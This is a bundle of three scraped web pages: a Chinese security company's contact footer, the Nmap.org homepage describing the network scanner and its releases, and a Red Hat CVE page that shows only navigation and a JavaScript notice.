* [公司简介](https://web.archive.org/web/20140707080006/http%3A//www.gltc.cn/category/gywm)
* [公司文化](https://web.archive.org/web/20140707080006/http%3A//www.gltc.cn/category/gywm)
* [公司愿景](https://web.archive.org/web/20140707080006/http%3A//www.gltc.cn/category/gywm)
* [资质荣誉](https://web.archive.org/web/20140707080006/http%3A//www.gltc.cn/category/gywm)

[合作伙伴](https://web.archive.org/web/20140707080006/http%3A//www.gltc.cn/category/hzhb)

* [专业安全公司](https://web.archive.org/web/20140707080006/http%3A//www.gltc.cn/category/hzhb)
* [系统集成公司](https://web.archive.org/web/20140707080006/http%3A//www.gltc.cn/category/hzhb)

[解决方案](https://web.archive.org/web/20140707080006/http%3A//www.gltc.cn/category/khzcypx)

* 定制解决方案
* 行业解决方案

联系我们

* 电话：010-60607125
* 传真：010-60607123
* Email：admin@gltc.cn
* 地址：北京市海淀区农大南路树村甲15号

* © 国联天成 2013 版权所有 京ICP备09101833号



=== Content from nmap.org_9ba698e9_20250126_110521.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[Download](/download.html)
[Reference Guide](/book/man.html)
[Book](/book/)
[Docs](/docs.html)
[Zenmap GUI](/zenmap/)
[In the Movies](/movies/)

[Get Nmap 7.95 here](/download)
## News

* Nmap.org has been redesigned! Our new mobile-friendly layout is also on [Npcap.com](https://npcap.com),
  [Seclists.org](https://seclists.org),
  [Insecure.org](https://insecure.org), and
  [Sectools.org](https://sectools.org).* Nmap 7.90 has been released with Npcap 1.00 along with dozens of other performance improvements, bug fixes, and feature enhancements! [[Release Announcement](https://seclists.org/nmap-announce/2020/1) | [Download page](https://nmap.org/download.html)]* After more than 7 years of development and 170 public pre-releases, we're delighted to announce Npcap version 1.00! [[Release Announcement](https://seclists.org/nmap-announce/2020/0) | [Download page](https://nmap.org/npcap/)]* Nmap 7.80 was released for DEFCON 27! [[release notes](https://seclists.org/nmap-announce/2019/0) | [download](https://nmap.org/download.html)]* Nmap turned 20 years old on September 1, 2017! Celebrate by reading [the original Phrack #51 article](/p51-11.html). [#Nmap20](https://twitter.com/hashtag/Nmap20)!* Nmap 7.50 is now available! [[release notes](https://seclists.org/nmap-announce/2017/3) | [download](https://nmap.org/download.html)]* Nmap 7 is now available! [[release notes](/7/) | [download](https://nmap.org/download.html)]* We're pleased to release our new and Improved [Icons of the Web](/favicon/) project—a 5-gigapixel interactive collage of the top million sites on the Internet!* Nmap has been discovered in two new movies! It's used to [hack Matt Damon's brain in Elysium](movies/#elysium) and also to [launch nuclear missiles in G.I. Joe: Retaliation](movies/#gijoe)!* We're delighted to announce Nmap 6.40 with 14 new [NSE scripts](/book/nse.html), hundreds of new [OS](/book/osdetect.html) and [version detection](/book/vscan.html) signatures, and many great new features! [[Announcement/Details](https://seclists.org/nmap-announce/2013/1)], [[Download Site](https://nmap.org/download.html)]* We just released Nmap 6.25 with 85 new NSE scripts, performance improvements, better OS/version detection, and more! [[Announcement/Details](https://seclists.org/nmap-hackers/2012/4)], [[Download Site](https://nmap.org/download.html)]* Any release as big as Nmap 6 is bound to uncover a few bugs. We've now fixed them with [Nmap 6.01](https://seclists.org/nmap-hackers/2012/3)!* Nmap 6 is now available! [[release notes](/6/) | [download](https://nmap.org/download.html)]* The security community has spoken! 3,000 of you shared favorite security tools for our relaunched [SecTools.Org](https://sectools.org). It is sort of like Yelp for security tools. Are you familiar with all of the [49 new tools](https://sectools.org/tag/new/) in this edition?* [Nmap 5.50 Released](https://seclists.org/nmap-hackers/2011/0): Now with Gopher protocol support! Our first stable release in a year includes 177 NSE scripts, 2,982 OS fingerprints, and 7,319 version detection signatures. Release focuses were the Nmap Scripting Engine, performance, Zenmap GUI, and the Nping packet analysis tool. [[Download page](https://nmap.org/download) | [Release notes](https://seclists.org/nmap-hackers/2011/0)]* Those who missed Defcon can now watch Fyodor and David Fifield demonstrate the power of the Nmap Scripting Engine. They give an overview of NSE, use it to explore Microsoft's global network, write an NSE script from scratch, and hack a webcam--all in 38 minutes! ([Presentation video](/presentations/BHDC10/))* *Icons of the Web*: explore favicons for the top million web sites with our [new poster and online viewer](/favicon).* We're delighted to announce the immediate, free availability of the [Nmap Security Scanner version 5.00](/5/). Don't miss the [top 5 improvements in Nmap 5](/5/#5changes).* After years of effort, we are delighted to release [Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning](/book/)!* We now have an active Nmap [Facebook page](http://facebook.com/nmap) and [Twitter feed](http://twitter.com/nmap/) to augment the [mailing lists](#lists). All of these options offer RSS feeds as well.

# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*
mailing list. It is a low volume (6 posts in 2017), moderated list
for the most important announcements about Nmap, Insecure.org, and
related projects. You can join more than 128,000 current subscribers
by submitting your email address here:

(or subscribe with custom options from the [Nmap-hackers list info page](https://nmap.org/mailman/listinfo/announce))

We also have a development list for more hardcore members
(especially programmers) who are interested in helping the project by
helping with coding, testing, feature ideas, etc. New (test/beta)
versions of Nmap are sometimes released here prior to general
availability for QA purposes. You can subscribe at the [Nmap-dev list
info page](https://nmap.org/mailman/listinfo/dev).

Both lists are archived (along with many other security lists) at [Seclists.org](https://seclists.org).

Though it isn't nearly as active as the mailing lists, the official IRC channel is #nmap on [Freenode](http://freenode.net/) (irc.freenode.net).

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from access.redhat.com_f59b7d5c_20250126_110521.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)


